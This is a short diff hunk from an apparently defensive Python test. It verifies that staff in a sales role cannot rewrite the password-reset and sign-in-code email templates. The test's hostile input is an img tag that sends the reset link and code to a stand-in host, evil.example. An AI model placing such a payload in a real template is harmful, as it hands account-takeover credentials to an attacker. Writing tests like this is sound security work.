@@ -428,7 +428,7 @@ def test_credential_email_templates_cannot_be_changed_by_staff(staff_client, cod
     """Otherwise a consultant could make the super admin's reset link or a sign-in code reach them."""
     from apps.notifications.models import EmailTemplate
 
-    template = EmailTemplate.objects.create(code=code, name=code, subject="S", body="<p>{{reset_link}}</p>")
+    template = EmailTemplate.objects.get(code=code)  # the standard version (migration 0008)
     client = staff_client(Role.SALES_CRM)
     evil = {"body": '<img src="https://evil.example/?{{reset_link}}{{code}}">'}
     assert (
